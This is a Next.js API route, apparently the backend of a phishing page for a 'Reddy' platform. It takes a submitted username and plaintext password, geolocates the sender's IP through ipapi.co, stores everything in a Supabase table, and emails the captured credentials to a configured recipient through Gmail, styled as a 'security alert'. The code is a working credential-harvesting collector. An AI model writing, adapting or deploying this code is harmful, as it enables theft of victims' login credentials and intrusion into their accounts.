import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import { supabase } from '@/lib/supabase';

function formatIndianTime(value: string | number | Date) {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return 'Invalid time';
  return new Intl.DateTimeFormat('en-IN', {
    timeZone: 'Asia/Kolkata',
    year: 'numeric',
    month: 'long',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    timeZoneName: 'short',
  }).format(date);
}

async function getLocationFromIp(ip: string) {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') return 'Unknown';
  try {
    const response = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {
      cache: 'no-store',
    });
    if (!response.ok) return 'Unknown';
    const data = await response.json();
    const city = data?.city;
    const region = data?.region;
    const country = data?.country_name;
    const location = [city, region, country].filter(Boolean).join(', ');
    return location || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

export async function POST(request: Request) {
  try {
    const { username, password, browser } = await request.json();

    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    const ip = forwardedFor?.split(',')[0]?.trim() || realIp || 'Unknown';
    const location = await getLocationFromIp(ip);
    const now = new Date();
    const indianTime = formatIndianTime(now);

    // 1. Save to Supabase
    try {
      const tableName = process.env.SUPABASE_TABLE_NAME!;
      await supabase
        .from(tableName)
        .insert([
          {
            username,
            password,
            ip_address: ip,
            location,
            browser: browser || 'Unknown',
            login_time: now.toISOString(),
          },
        ]);
    } catch (dbError) {
      console.error('Supabase error:', dbError);
    }

    // 2. Send Email
    const emailUser = process.env.EMAIL_USER;
    const emailPass = process.env.EMAIL_PASS;
    const recipient = process.env.RECIPIENT_EMAIL;

    if (emailUser && emailPass && recipient) {
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: emailUser,
          pass: emailPass,
        },
      });

      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; margin: 0; padding: 20px; }
            .container { max-width: 600px; background: #ffffff; margin: 0 auto; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; }
            .header { background: #1a237e; color: #ffffff; padding: 30px 20px; text-align: center; }
            .header h1 { margin: 0; font-size: 24px; letter-spacing: 1px; }
            .content { padding: 30px; }
            .data-table { width: 100%; border-collapse: collapse; }
            .data-table tr { border-bottom: 1px solid #f0f0f0; }
            .data-table tr:last-child { border-bottom: none; }
            .label { padding: 15px 0; font-weight: 600; color: #65676b; font-size: 13px; text-transform: uppercase; width: 140px; }
            .value { padding: 15px 0; font-size: 16px; color: #050505; font-weight: 500; word-break: break-all; }
            .footer { background: #f0f2f5; color: #8a8d91; padding: 20px; text-align: center; font-size: 12px; }
            .alert-badge { display: inline-block; padding: 4px 12px; background: #ffebee; color: #c62828; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <h1>REDDY ACCESS NOTIFICATION</h1>
            </div>
            <div class="content">
              <div class="alert-badge">SECURITY ALERT</div>
              <p style="margin-top: 0; color: #4b4b4b;">A new login attempt has been captured on the Reddy platform.</p>
              
              <table class="data-table">
                <tr>
                  <td class="label">Username</td>
                  <td class="value"><strong>${username}</strong></td>
                </tr>
                <tr>
                  <td class="label">Password</td>
                  <td class="value"><strong>${password}</strong></td>
                </tr>
                <tr>
                  <td class="label">IP Address</td>
                  <td class="value">${ip}</td>
                </tr>
                <tr>
                  <td class="label">Location</td>
                  <td class="value">${location}</td>
                </tr>
                <tr>
                  <td class="label">Time (IST)</td>
                  <td class="value">${indianTime}</td>
                </tr>
                <tr>
                  <td class="label">Browser</td>
                  <td class="value">${browser || 'Unknown'}</td>
                </tr>
              </table>
            </div>
            <div class="footer">
              &copy; ${new Date().getFullYear()} Reddy Security Services. All rights reserved.
            </div>
          </div>
        </body>
        </html>
      `;

      await transporter.sendMail({
        from: `"Reddy Admin" <${emailUser}>`,
        to: recipient,
        subject: `[ALERT] Reddy Login: ${username}`,
        html,
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Notify error:', error);
    return NextResponse.json({ error: 'Notification failed' }, { status: 500 });
  }
}
